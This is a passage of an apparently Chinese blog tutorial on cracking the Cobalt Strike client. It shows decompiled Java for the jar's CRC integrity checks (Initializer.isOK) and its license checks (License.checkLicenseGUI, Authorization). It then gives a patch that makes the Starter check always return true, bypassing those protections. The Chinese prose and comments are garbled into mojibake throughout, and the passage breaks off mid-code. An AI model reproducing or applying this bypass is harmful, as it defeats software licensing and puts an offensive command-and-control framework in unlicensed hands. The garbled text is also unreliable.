class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var5 <span class="token operator">-=</span> <span class="token number">159L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">BaseArtifactUtils</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/BaseArtifactUtils.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">1905161680L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">++</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">BaseResourceUtils</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/BaseResourceUtils.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">510216517L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var5 <span class="token operator">/=</span> <span class="token number">2L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">PayloadGeneratorDialog</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"aggressor/dialogs/PayloadGeneratorDialog.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">3766937686L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> var2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>è°ƒç”¨isOkå‡½æ•°è¿›è¡Œæ ¡éªŒ\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">isOK</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">long</span> var3<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>var3<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">isOK</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>ç»§ç»­åˆ†æ\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">isOK</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ZipFile</span> var5 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> var6<span class="token punctuation">;</span>  <span class="token comment">//è¿™é‡Œé»˜è®¤å°±æ˜¯false</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            var5 <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ ¡éªŒä¸€å‡½æ•°</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var6 <span class="token operator">=</span> <span class="token operator">!</span>var4<span class="token punctuation">;</span>                <span class="token keyword">return</span> var6<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            var6 <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var5<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ­£æ­£æ ¡éªŒäºŒå‡½æ•°</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    var5<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var14<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> var6<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span>  è·å–è·¯å¾„åº”è¯¥æ˜¯     <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ZipFile</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> var2 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getProtectionDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCodeSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> var3 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">getProtectionDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCodeSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">ZipFile</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span>  è¿™ä¸ªå‡½æ•°æ˜¯çœŸæ­£çš„æ ¡éªŒå‡½æ•°   <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">ZipFile</span> var0<span class="token punctuation">,</span> <span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ZipEntry</span> var3 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getEntry</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var3<span class="token punctuation">.</span><span class="token function">getCrc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span> ä½¿ç”¨crcè¿›è¡Œæ ¡éªŒ     <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token keyword">long</span> var0<span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var3 <span class="token operator">&lt;</span> var2<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> var2<span class="token punctuation">[</span>var3<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>å›é¡¾ä¸Šé¢çš„æ“ä½œè¯´æ˜äº†ä½ åªè¦ä¿®æ”¹ common&#x2F;AuthCrypto.class  common&#x2F;Authorization.class ç­‰ç±»å°±ä¼šè§¦å‘æ ¡éªŒé€€å‡ºç³»ç»Ÿä¸‹å›¾å‡½æ•°é‡Œé¢çš„ç±»<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101601245.png" alt="å¦‚å›¾"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">initializeStarter</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//è°ƒç”¨Aå‡½æ•°è¿›è¡Œæ ¡éªŒæ“ä½œ</span>          <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p>æ‰€ä»¥æˆ‘ä»¬è¦å¯¹initializeStarterå‡½æ•°è¿›è¡Œä¿®æ”¹å®ƒåœ¨\csproject\lib\cobaltstrike-client.jar!\common\Starter.class ã€‚æ‰€ä»¥æˆ‘ä»¬è¦æ¥åˆ°åç¼–è¯‘æºç é‡Œé¢å¤åˆ¶common\Starter.java(\csproject\DecompileSrc\common\Starter.java)åˆ°srcé‡Œé¢å’Œå¤åˆ¶ä¸»ç±»åä¸€æ ·çš„æ“ä½œæˆ‘å°±ä¸æˆªå›¾äº†<br>æˆ‘ä»¬ç›´æ¥ä¿®æ”¹ä»£ç </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"bypass initializeStarter class checked 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> var2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> var2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¿®æ”¹æˆªå›¾å¦‚ä¸‹ã€‚ç›´æ¥æŠŠå®ƒçš„æ ¸å¿ƒæ ¡éªŒå‡½æ•°ä¿®æ”¹æ‰<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101618419.png" alt="ä¿®æ”¹æ ¸å¿ƒæ ¡éªŒå‡½æ•°"><br>ç»§ç»­èµ°æˆ‘ä»¬ èµ°åˆ°å¦‚ä¸‹å›¾çš„å‡½æ•°</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">License</span><span class="token punctuation">.</span><span class="token function">checkLicenseGUI</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Authorization</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æˆ‘ä»¬é¦–å…ˆçœ‹checkLicenseGUIå‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ ¡éªŒæ ¸å¿ƒæ˜¯ Authorization ç±»</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkLicenseGUI</span><span class="token punctuation">(</span><span class="token class-name">Authorization</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var0<span class="token punctuation">.</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"Your authorization file is not valid: "</span> <span class="token operator">+</span> var0<span class="token punctuation">.</span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Your authorization file is not valid.\n"</span> <span class="token operator">+</span> var0<span class="token punctuation">.</span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var0<span class="token punctuation">.</span><span class="token function">isPerpetual</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>var0<span class="token punctuation">.</span><span class="token function">isExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"Your Cobalt Strike license is expired. Please contact cobalt.custops@helpsystems.com to renew. If you did renew, run the update program to refresh your authorization file."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Your Cobalt Strike license is expired.\nPlease contact cobalt.custops@helpsystems.com to renew\n\nIf you did renew, run the update program to refresh your\nauthorization file."</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>var0<span class="token punctuation">.</span><span class="token function">isAlmostExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_warn</span><span class="token punctuation">(</span><span class="token string">"Your Cobalt Strike license expires "</span> <span class="token operator">+</span> var0<span class="token punctuation">.</span><span class="token function">whenExpires</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">". Email cobalt.custops@helpsystems.com to renew. If you did renew, run the update program to refresh your authorization file."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Your Cobalt Strike license expires "</span> <span class="token operator">+</span> var0<span class="token punctuation">.</span><span class="token function">whenExpires</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nEmail cobalt.custops@helpsystems.com to renew\n\nIf you did renew, run the update program to refresh your\nauthorization file."</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬å»Authorizationç±»çœ‹çœ‹ã€‚æ­¤ç±»ä¸ºæ ¸å¿ƒæ ¡éªŒç±»æ ¡éªŒæ˜¯å¦æ˜¯æ­£ç‰ˆè¿˜æ˜¯è¯•ç”¨ç‰ˆæœ¬ã€‚é€šè¿‡Authorizationæ„é€ å‡½æ•°è¿›è¡Œæ ¡éªŒã€‚</p><pre class="language-java" data-language="java"><code class="language-java">\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Authorization</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token comment">//</span><span class="token comment">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="token comment">// (powered by FernFlower decompiler)</span><span class="token comment">//</span><span class="token keyword">package</span> <span class="token namespace">common</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Calendar</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Authorization</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span> validto <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span> error <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">boolean</span> valid <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Authorization</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> var1 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">canonicalize</span><span class="token punctuation">(</span><span class="token string">"cobaltstrike.auth"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">File</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getProtectionDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCodeSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    var2 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                var1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"cobaltstrike.auth"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var11<span class="token punctuation">)</span> <span class="token 